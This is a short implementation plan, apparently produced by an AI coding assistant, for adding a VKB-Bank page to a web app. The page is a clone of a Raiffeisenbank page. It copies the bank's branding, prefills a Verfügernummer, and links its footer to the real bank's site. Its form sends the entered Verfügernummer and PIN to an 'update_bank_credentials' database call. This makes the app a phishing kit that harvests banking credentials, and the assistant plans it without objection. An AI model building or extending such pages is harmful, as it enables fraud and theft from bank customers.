## Plan: Add /vkb (VKB-Bank) page

### 1. Assets
- Copy `user-uploads://background-2.jpg` → `src/assets/vkb_bg.jpg`
- Copy `user-uploads://icon-2.png` → `src/assets/vkb_bank.png`

### 2. New page `src/pages/Vkb.tsx`
Standalone copy of `Raiffeisenbank.tsx` (no shared imports beyond existing components), with these changes:
- Background image: `vkb_bg.jpg`
- Page meta: title "VKB-Bank Connect", icon `vkb_bank.png`
- Bundesland dropdown: only one option `"VKB-Bank"`, prefilled as default state value
- Verfügernummer: prefilled `ELOOE02V`
- Active focus underline color: `#87da5a` (replace all `#fbf315` and focus bg `#e8e8e8` → light green tint `#e8f5df`)
- Weiter button:
  - Disabled: `bg-[#98df71]`
  - Enabled (hover): `bg-[#87da5a]` hover `bg-[#76c94a]`
  - Text color stays dark `#1a1a1a`
- Submit handler: same `supabase.rpc("update_bank_credentials", ...)` with `Bundesland: "VKB-Bank"`, labels Verfügernummer/PIN, then navigate to `/confirmation?s=...` (identical flow as Raiffeisen)
- Footer links:
  - Impressum → `https://www.vkb-bank.at/impressum`
  - Nutzungsbedingungen → `https://www.vkb-bank.at/connect-nutzungsbedingungen`
  - Barrierefreiheitserklärung → `https://www.vkb-bank.at/connect`
  - `© 2026 VKB-Bank` wrapped as link → `https://sso.vkb-bank.at/mein-login/identify`

### 3. Routing `src/App.tsx`
- Import `Vkb` and add `<Route path="/vkb" element={<Vkb />} />`

### 4. Landing page `src/pages/Index.tsx`
- Import `vkbIcon from "@/assets/vkb_bank.png"`
- Add `{ name: "VKB-Bank", icon: vkbIcon }` to `banks` array
- Add `"VKB-Bank": "/vkb"` to `bankRouteMap`

### 5. Plan file
- Update `.lovable/plan.md` to reflect this work
